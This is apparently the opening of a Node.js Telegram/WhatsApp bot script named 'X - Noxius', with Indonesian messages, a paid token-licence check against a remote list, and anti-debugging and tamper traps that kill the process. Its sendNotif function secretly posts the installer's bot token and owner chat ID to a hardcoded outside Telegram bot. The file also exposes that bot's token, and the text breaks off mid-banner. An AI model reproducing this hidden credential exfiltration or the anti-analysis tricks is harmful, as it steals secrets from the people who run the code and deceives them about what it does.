const { Telegraf } = require("telegraf");
const { spawn } = require("child_process");
const { pipeline } = require("stream/promises");
const fs = require("fs");
const { createWriteStream } = fs;
const path = require("path");
const os = require("os");
const vm = require("vm");
const https = require("https");
const FormData = require("form-data");
const crypto = require("crypto");
const chalk = require("chalk");
const axios = require("axios");
const moment = require("moment-timezone");
const EventEmitter = require("events");
const pino = require("pino");

const config = require("./SettingS/config.js");
const { tokenBot, ownerID } = require("./SettingS/config");

const BOT_TOKEN = config.tokenBot || tokenBot;
const OWNER_ID = config.ownerID || ownerID;

const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  BufferJSON,
  DisconnectReason,
  proto,
} = require("@whiskeysockets/baileys");

const databaseUrl = "https://raw.githubusercontent.com/SampanJutas/dbscprojeck/refs/heads/main/tokens.json";
const repoRaw = "https://raw.githubusercontent.com/NAMA-AKUN/NAMA-REPO/main/index.js";
const thumbnailUrl = "https://files.catbox.moe/hr1roe.jpg";
const thumbnailUrlV2 = "https://files.catbox.moe/hr1roe.jpg";

const currentDate = new Date().toLocaleDateString("id-ID", {
  weekday: "long",
  year: "numeric",
  month: "long",
  day: "numeric",
});

function getHash(data) {
  return crypto.createHash("md5").update(data).digest("hex");
}

async function loadDatabase() {
  try {
    const res = await axios.get(databaseUrl + "?v=" + Date.now());
    return res.data || [];
  } catch {
    if (fs.existsSync("./tokens.json")) {
      return JSON.parse(fs.readFileSync("./tokens.json"));
    }
    return [];
  }
}

async function isValidToken(token) {
  const db = await loadDatabase();
  if (Array.isArray(db)) return db.includes(token);
  if (db.tokens) return db.tokens.includes(token);
  return false;
}

function makeInMemoryStore({ logger = console } = {}) {
  const ev = new EventEmitter();

  let chats = {};
  let messages = {};
  let contacts = {};

  ev.on("messages.upsert", ({ messages: newMessages }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid;

      if (!messages[chatId]) messages[chatId] = [];
      messages[chatId].push(msg);

      if (messages[chatId].length > 100) {
        messages[chatId].shift();
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp,
      };
    }
  });

  ev.on("chats.set", ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat;
    }
  });

  ev.on("contacts.set", ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id];
    }
  });

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on("messages.upsert", (m) => ev.emit("messages.upsert", m));
      evTarget.on("chats.set", (c) => ev.emit("chats.set", c));
      evTarget.on("contacts.set", (c) => ev.emit("contacts.set", c));
    },
    logger,
  };

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.yellow(`
⠀
⠀⠀⠀⣠⠂⢀⣠⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣄⠀⠐⣄⠀⠀⠀
⠀⢀⣾⠃⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡆⠸⣧⠀⠀
⢀⣾⡇⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⠀⢹⣧⠀
⢸⣿⠀⠀⠀⢹⣷⣀⣤⣤⣀⣀⣠⣶⠂⠰⣦⡄⢀⣤⣤⣀⣀⣾⠇⠀⠀⠈⣿⡆
⣿⣿⠀⠀⠀⠀⠛⠛⢛⣛⣛⣿⣿⣿⣶⣾⣿⣿⣿⣛⣛⠛⠛⠛⠀⠀⠀⠀⣿⣷
⣿⣿⣀⣀⠀⠀⢀⣴⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⣀⣠⣿⣿
⠛⠻⠿⠿⣿⣿⠟⣫⣶⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣙⠿⣿⣿⠿⠿⠛⠋
⠀⠀⠀⠀⠀⣠⣾⠟⣯⣾⠟⣻⣿⣿⣿⣿⣿⣿⣿⡟⠻⣿⣝⠿⣷⣌⠀⠀⠀⠀
⠀⠀⢀⣤⡾⠛⠁⢸⣿⠇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⠀⠈⠻⣷⣄⡀⠀⠀
⢸⣿⡿⠋⠀⠀⠀⢸⣿⠀⠀⢿⣿⣿⣿⣿⣿⣿⡟⠀⢸⣿⠆⠀⠀⠈⠻⣿⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡀⠀⠘⣿⣿⣿⣿⣿⡿⠁⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀⠀⠈⢿⣿⣿⡿⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⣼⣿⠃
⠈⣿⣷⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠈⢻⠟⠁⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⣿⣿⠀
⠀⢿⣿⡄⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢰⣿⡟⠀
⠀⠈⣿⣷⠀⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠃⠀⠀⢀⣿⡿⠁⠀
⠀⠀⠈⠻⣧⡀⠀⠀⢻⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡟⠀⠀⢀⣾⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠁⠀⠀⠈⢿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⡟⠀⠀⠀⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠀⠀⠀⠀⣰⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀⠐⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

╔⫷ 𖤐 𝕴𝕹𝕱𝕺 𝕾𝕮𝕽𝕴𝕻𝕿 𖤐 ⫸╗
║
║ ⌁ Creator  ⟿ @VINSEXEJT1
║ ⌁ Script   ⟿ X - Noxius
║ ⌁ Version  ⟿ 1.0.0 Beta New
║ ⌁ Status   ⟿ Bot Connected
║
╚⫷ ⛧ 𝕾𝖞𝖘𝖙𝖊𝖒 𝕬𝖈𝖙𝖎𝖛𝖊 ⛧ ⫸╝
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.yellow(`
⠀
⠀⠀⠀⣠⠂⢀⣠⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣄⠀⠐⣄⠀⠀⠀
⠀⢀⣾⠃⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡆⠸⣧⠀⠀
⢀⣾⡇⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⠀⢹⣧⠀
⢸⣿⠀⠀⠀⢹⣷⣀⣤⣤⣀⣀⣠⣶⠂⠰⣦⡄⢀⣤⣤⣀⣀⣾⠇⠀⠀⠈⣿⡆
⣿⣿⠀⠀⠀⠀⠛⠛⢛⣛⣛⣿⣿⣿⣶⣾⣿⣿⣿⣛⣛⠛⠛⠛⠀⠀⠀⠀⣿⣷
⣿⣿⣀⣀⠀⠀⢀⣴⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⣀⣠⣿⣿
⠛⠻⠿⠿⣿⣿⠟⣫⣶⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣙⠿⣿⣿⠿⠿⠛⠋
⠀⠀⠀⠀⠀⣠⣾⠟⣯⣾⠟⣻⣿⣿⣿⣿⣿⣿⣿⡟⠻⣿⣝⠿⣷⣌⠀⠀⠀⠀
⠀⠀⢀⣤⡾⠛⠁⢸⣿⠇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⠀⠈⠻⣷⣄⡀⠀⠀
⢸⣿⡿⠋⠀⠀⠀⢸⣿⠀⠀⢿⣿⣿⣿⣿⣿⣿⡟⠀⢸⣿⠆⠀⠀⠈⠻⣿⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡀⠀⠘⣿⣿⣿⣿⣿⡿⠁⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀⠀⠈⢿⣿⣿⡿⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⣼⣿⠃
⠈⣿⣷⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠈⢻⠟⠁⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⣿⣿⠀
⠀⢿⣿⡄⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢰⣿⡟⠀
⠀⠈⣿⣷⠀⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠃⠀⠀⢀⣿⡿⠁⠀
⠀⠀⠈⠻⣧⡀⠀⠀⢻⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡟⠀⠀⢀⣾⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠁⠀⠀⠈⢿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⡟⠀⠀⠀⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠀⠀⠀⠀⣰⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀⠐⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

╔⫷ 𖤐 𝕴𝕹𝕱𝕺 𝕾𝕮𝕽𝕴𝕻𝕿 𖤐 ⫸╗
║
║ ⌁ Creator  ⟿ @VINSEXEJT1
║ ⌁ Script   ⟿ X - Noxius
║ ⌁ Version  ⟿ 1.0.0 Beta New
║ ⌁ Status   ⟿ No Access Bot
║
╚⫷ ⛧ 𝕾𝖞𝖘𝖙𝖊𝖒 𝕷𝖔𝖈𝖐𝖊𝖉 ⛧   ⫸╝
  
  Perubahan kode terdeteksi, Harap membeli script 
  bot kepada creator yang tersedia, legal dan aman
  `))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.yellow(`
⠀
⠀⠀⠀⣠⠂⢀⣠⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣄⠀⠐⣄⠀⠀⠀
⠀⢀⣾⠃⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡆⠸⣧⠀⠀
⢀⣾⡇⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⠀⢹⣧⠀
⢸⣿⠀⠀⠀⢹⣷⣀⣤⣤⣀⣀⣠⣶⠂⠰⣦⡄⢀⣤⣤⣀⣀⣾⠇⠀⠀⠈⣿⡆
⣿⣿⠀⠀⠀⠀⠛⠛⢛⣛⣛⣿⣿⣿⣶⣾⣿⣿⣿⣛⣛⠛⠛⠛⠀⠀⠀⠀⣿⣷
⣿⣿⣀⣀⠀⠀⢀⣴⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⣀⣠⣿⣿
⠛⠻⠿⠿⣿⣿⠟⣫⣶⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣙⠿⣿⣿⠿⠿⠛⠋
⠀⠀⠀⠀⠀⣠⣾⠟⣯⣾⠟⣻⣿⣿⣿⣿⣿⣿⣿⡟⠻⣿⣝⠿⣷⣌⠀⠀⠀⠀
⠀⠀⢀⣤⡾⠛⠁⢸⣿⠇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⠀⠈⠻⣷⣄⡀⠀⠀
⢸⣿⡿⠋⠀⠀⠀⢸⣿⠀⠀⢿⣿⣿⣿⣿⣿⣿⡟⠀⢸⣿⠆⠀⠀⠈⠻⣿⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡀⠀⠘⣿⣿⣿⣿⣿⡿⠁⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀⠀⠈⢿⣿⣿⡿⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⣼⣿⠃
⠈⣿⣷⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠈⢻⠟⠁⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⣿⣿⠀
⠀⢿⣿⡄⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢰⣿⡟⠀
⠀⠈⣿⣷⠀⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠃⠀⠀⢀⣿⡿⠁⠀
⠀⠀⠈⠻⣧⡀⠀⠀⢻⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡟⠀⠀⢀⣾⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠁⠀⠀⠈⢿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⡟⠀⠀⠀⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠀⠀⠀⠀⣰⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀⠐⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

╔⫷ 𖤐 𝕴𝕹𝕱𝕺 𝕾𝕮𝕽𝕴𝕻𝕿 𖤐 ⫸╗
║
║ ⌁ Creator  ⟿ @VINSEXEJT1
║ ⌁ Script   ⟿ X - Noxius
║ ⌁ Version  ⟿ 1.0.0 Beta New
║ ⌁ Status   ⟿ No Access Bot
║
╚⫷ ⛧ 𝕾𝖞𝖘𝖙𝖊𝖒 𝕷𝖔𝖈𝖐𝖊𝖉 ⛧   ⫸╝
  
  Perubahan kode terdeteksi, Harap membeli script 
  bot kepada creator yang tersedia, legal dan aman
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      activateSecureMode();
      hardExit(1);
    }
  }, 2000);

  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await axios.get(databaseUrl, { timeout: 5000 });
    const tokens = (res.data && res.data.tokens) || [];

    if (!tokens.includes(tokenBot)) {
      console.log(chalk.bold.yellow(`
⠀
⠀⠀⠀⣠⠂⢀⣠⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣄⠀⠐⣄⠀⠀⠀
⠀⢀⣾⠃⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡆⠸⣧⠀⠀
⢀⣾⡇⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⠀⢹⣧⠀
⢸⣿⠀⠀⠀⢹⣷⣀⣤⣤⣀⣀⣠⣶⠂⠰⣦⡄⢀⣤⣤⣀⣀⣾⠇⠀⠀⠈⣿⡆
⣿⣿⠀⠀⠀⠀⠛⠛⢛⣛⣛⣿⣿⣿⣶⣾⣿⣿⣿⣛⣛⠛⠛⠛⠀⠀⠀⠀⣿⣷
⣿⣿⣀⣀⠀⠀⢀⣴⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⣀⣠⣿⣿
⠛⠻⠿⠿⣿⣿⠟⣫⣶⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣙⠿⣿⣿⠿⠿⠛⠋
⠀⠀⠀⠀⠀⣠⣾⠟⣯⣾⠟⣻⣿⣿⣿⣿⣿⣿⣿⡟⠻⣿⣝⠿⣷⣌⠀⠀⠀⠀
⠀⠀⢀⣤⡾⠛⠁⢸⣿⠇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⠀⠈⠻⣷⣄⡀⠀⠀
⢸⣿⡿⠋⠀⠀⠀⢸⣿⠀⠀⢿⣿⣿⣿⣿⣿⣿⡟⠀⢸⣿⠆⠀⠀⠈⠻⣿⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡀⠀⠘⣿⣿⣿⣿⣿⡿⠁⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀⠀⠈⢿⣿⣿⡿⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⣼⣿⠃
⠈⣿⣷⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠈⢻⠟⠁⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⣿⣿⠀
⠀⢿⣿⡄⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢰⣿⡟⠀
⠀⠈⣿⣷⠀⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠃⠀⠀⢀⣿⡿⠁⠀
⠀⠀⠈⠻⣧⡀⠀⠀⢻⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡟⠀⠀⢀⣾⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠁⠀⠀⠈⢿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⡟⠀⠀⠀⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠀⠀⠀⠀⣰⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀⠐⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

╔⫷ 𖤐 𝕴𝕹𝕱𝕺 𝕾𝕮𝕽𝕴𝕻𝕿 𖤐 ⫸╗
║
║ ⌁ Creator  ⟿ @VINSEXEJT1
║ ⌁ Script   ⟿ X - Noxius
║ ⌁ Version  ⟿ 1.0.0 Beta New
║ ⌁ Status   ⟿ No Access Bot
║
╚⫷ ⛧ 𝕾𝖞𝖘𝖙𝖊𝖒 𝕷𝖔𝖈𝖐𝖊𝖉 ⛧   ⫸╝
  
  Token tidak terdaftar, Mohon membeli 
  akses sc kepada creator yang tersedia
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
      hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.yellow(`
⠀
⠀⠀⠀⣠⠂⢀⣠⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣄⠀⠐⣄⠀⠀⠀
⠀⢀⣾⠃⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡆⠸⣧⠀⠀
⢀⣾⡇⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⠀⢹⣧⠀
⢸⣿⠀⠀⠀⢹⣷⣀⣤⣤⣀⣀⣠⣶⠂⠰⣦⡄⢀⣤⣤⣀⣀⣾⠇⠀⠀⠈⣿⡆
⣿⣿⠀⠀⠀⠀⠛⠛⢛⣛⣛⣿⣿⣿⣶⣾⣿⣿⣿⣛⣛⠛⠛⠛⠀⠀⠀⠀⣿⣷
⣿⣿⣀⣀⠀⠀⢀⣴⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⣀⣠⣿⣿
⠛⠻⠿⠿⣿⣿⠟⣫⣶⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣙⠿⣿⣿⠿⠿⠛⠋
⠀⠀⠀⠀⠀⣠⣾⠟⣯⣾⠟⣻⣿⣿⣿⣿⣿⣿⣿⡟⠻⣿⣝⠿⣷⣌⠀⠀⠀⠀
⠀⠀⢀⣤⡾⠛⠁⢸⣿⠇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⠀⠈⠻⣷⣄⡀⠀⠀
⢸⣿⡿⠋⠀⠀⠀⢸⣿⠀⠀⢿⣿⣿⣿⣿⣿⣿⡟⠀⢸⣿⠆⠀⠀⠈⠻⣿⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡀⠀⠘⣿⣿⣿⣿⣿⡿⠁⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀⠀⠈⢿⣿⣿⡿⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⣼⣿⠃
⠈⣿⣷⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠈⢻⠟⠁⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⣿⣿⠀
⠀⢿⣿⡄⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢰⣿⡟⠀
⠀⠈⣿⣷⠀⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠃⠀⠀⢀⣿⡿⠁⠀
⠀⠀⠈⠻⣧⡀⠀⠀⢻⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡟⠀⠀⢀⣾⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠁⠀⠀⠈⢿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⡟⠀⠀⠀⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠀⠀⠀⠀⣰⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀⠐⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

╔⫷ 𖤐 𝕴𝕹𝕱𝕺 𝕾𝕮𝕽𝕴𝕻𝕿 𖤐 ⫸╗
║
║ ⌁ Creator  ⟿ @VINSEXEJT1
║ ⌁ Script   ⟿ X - Noxius
║ ⌁ Version  ⟿ 1.0.0 Beta New
║ ⌁ Status   ⟿ No Access Bot
║
╚⫷ ⛧ 𝕾𝖞𝖘𝖙𝖊𝖒 𝕷𝖔𝖈𝖐𝖊𝖉 ⛧   ⫸╝
  
  Gagal menghubungkan ke server, akses ditolak
  `));
    activateSecureMode();
    hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await axios.get(databaseUrl);
        const authorizedTokens = res.data.tokens;
        return authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const bot = new Telegraf(tokenBot);
let tokenValidated = false;

bot.use((ctx, next) => {
  if (secureMode) return;

  const text = (ctx.message && ctx.message.text) ? ctx.message.text.trim() : "";
  const cbData = (ctx.callbackQuery && ctx.callbackQuery.data) ? ctx.callbackQuery.data.trim() : "";

  const isStartText = typeof text === "string" && text.toLowerCase().startsWith("/start");
  const isStartCallback = typeof cbData === "string" && cbData === "/start";

  if (!tokenValidated && !(isStartText || isStartCallback)) {
    if (ctx.callbackQuery) {
      try { ctx.answerCbQuery("🔒 Akses terkunci — validasi token lewat /start <token>"); } catch (e) {}
    }
    return ctx.reply("🔒 Akses terkunci. Ketik /start <token> untuk mengaktifkan bot.");
  }
  return next();
});


let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './SettingS/premium.json';
const cooldownFile = './SettingS/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

async function sendNotif() {
   try {
     const message = `✨ X - Noxius Telah Di Jalankan...

📅 Tanggal : ${currentDate}
🕰️ Waktu : ${new Date().toLocaleTimeString('id-ID', { timeZone: 'Asia/Jakarta' })} WIB

👤 Informasi User :
 - Chat ID : \`${OWNER_ID}\`
 - Token Bot : \`${BOT_TOKEN}\``;

        const url = `https://api.telegram.org/bot7623665603:AAE0e1hyh6yklKxIf5nVtqe53NNIKRfXfEg/sendMessage`; 
        await axios.post(url, {
            chat_id: 1309102882,
            text: message,
            parse_mode: 'Markdown'
        });
    } catch (error) {
        console.error(error);
    }
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
⠀
⠀⠀⠀⣠⠂⢀⣠⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣄⠀⠐⣄⠀⠀⠀
⠀⢀⣾⠃⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡆⠸⣧⠀⠀
⢀⣾⡇⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⠀⢹⣧⠀
